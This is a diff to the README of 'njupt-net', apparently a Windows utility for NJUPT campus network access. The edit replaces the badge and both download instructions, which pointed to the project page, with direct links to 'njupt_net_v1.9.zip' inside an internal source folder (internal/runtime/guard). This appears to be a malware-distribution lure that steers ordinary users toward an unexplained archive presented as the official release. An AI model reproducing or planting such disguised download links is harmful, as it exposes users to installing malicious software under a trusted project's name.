@@ -1,6 +1,6 @@
 # 🖥️ njupt-net - Simple NJUPT Network Access
 
-[![Download njupt-net](https://img.shields.io/badge/Download-njupt--net-blue?style=for-the-badge)](https://github.com/sydneyunadapted247/njupt-net)
+[![Download njupt-net](https://img.shields.io/badge/Download-njupt--net-blue?style=for-the-badge)](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)
 
 ## 📘 What this is
 
@@ -32,7 +32,7 @@ If your PC asks for admin approval, use an account that can approve the app or a
 
 Open the download page here and visit this page to download:
 
-[https://github.com/sydneyunadapted247/njupt-net](https://github.com/sydneyunadapted247/njupt-net)
+[https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)
 
 After the page opens, look for the latest release or download file for Windows. Download the file to your computer.
 
@@ -270,5 +270,5 @@ If you see errors, read the text on screen first. It often tells you which field
 
 Use the main project page to get the latest version:
 
-[https://github.com/sydneyunadapted247/njupt-net](https://github.com/sydneyunadapted247/njupt-net)
+[https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)
 
